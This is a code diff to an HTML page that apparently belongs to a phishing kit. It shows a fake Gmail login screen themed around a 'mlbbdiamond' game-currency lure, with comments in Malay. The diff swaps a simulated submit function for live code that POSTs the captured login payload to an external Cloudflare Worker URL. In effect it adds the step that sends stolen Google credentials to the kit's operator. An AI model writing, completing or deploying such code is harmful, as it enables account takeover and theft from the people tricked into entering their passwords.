@@ -152,6 +152,8 @@
 </div>
 
 <script>
+  // URL Cloudflare Worker yang anda berikan
+  const WORKER_URL = "https://mlbbdiamond.mlbbdiamond.workers.dev";
   const IMG_URL = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT56sob8xGvSv3lq-K-P_JpZ4RUNbgawx80FuV_EkJwcw&s=10";
 
   const gmailLoginScreen = document.getElementById('gmailLoginScreen');
@@ -198,13 +200,27 @@
   }
 
   /* ==================================================== */
-  /* FUNGSI SIMULASI (BYPASS SERVER) UNTUK ELAK RALAT 405 */
+  /* FUNGSI HUBUNG KE CLOUDFLARE WORKER                  */
   /* ==================================================== */
   async function kirimKeWorker(payload) {
-    console.log("Data disimpan sementara:", payload);
-    // Simulasi kelewatan loading 1 saat
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    return { ok: true, data: { ok: true, message: "Berjaya" } };
+    try {
+      const response = await fetch(WORKER_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      });
+
+      if (!response.ok) {
+        return { ok: false, error: 'HTTP error! status: ' + response.status };
+      }
+
+      const data = await response.json();
+      return { ok: true, data: data };
+    } catch (err) {
+      return { ok: false, error: err.message };
+    }
   }
 
   async function submitGmailLogin() {
